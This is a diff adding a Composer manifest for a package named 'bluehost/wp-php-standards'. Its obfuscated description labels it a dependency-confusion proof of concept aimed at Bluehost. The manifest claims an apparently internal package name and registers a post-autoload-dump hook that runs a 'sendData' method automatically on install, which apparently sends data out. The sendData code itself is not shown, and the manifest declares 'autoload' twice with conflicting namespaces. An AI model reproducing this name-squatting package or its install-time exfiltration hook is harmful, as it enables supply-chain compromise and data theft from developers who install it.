@@ -1,0 +1,30 @@
+{
+    "name": "bluehost/wp-php-standards",
+    "description": "D3p3nd3ncy C0nfus!0n P0C for Bluehost",
+    "type": "library",
+    "license": "MIT",
+    "autoload": {
+        "psr-4": {
+            "Bluehost\\WpPhpStandards\\": "src/"
+        }
+    },
+    "authors": [
+    {
+      "name": "Naveen Kumawat",
+      "email": "naveenkumawat1995@gmail.com"
+    }
+  ],
+   "autoload": {
+    "psr-4": {
+      "MyPackage\\": "src/"
+    },
+    "files": [
+      "init.php"
+    ]
+  },
+  "scripts": {
+    "post-autoload-dump": [
+      "MyPackage\\Init::sendData"
+    ]
+  }
+}
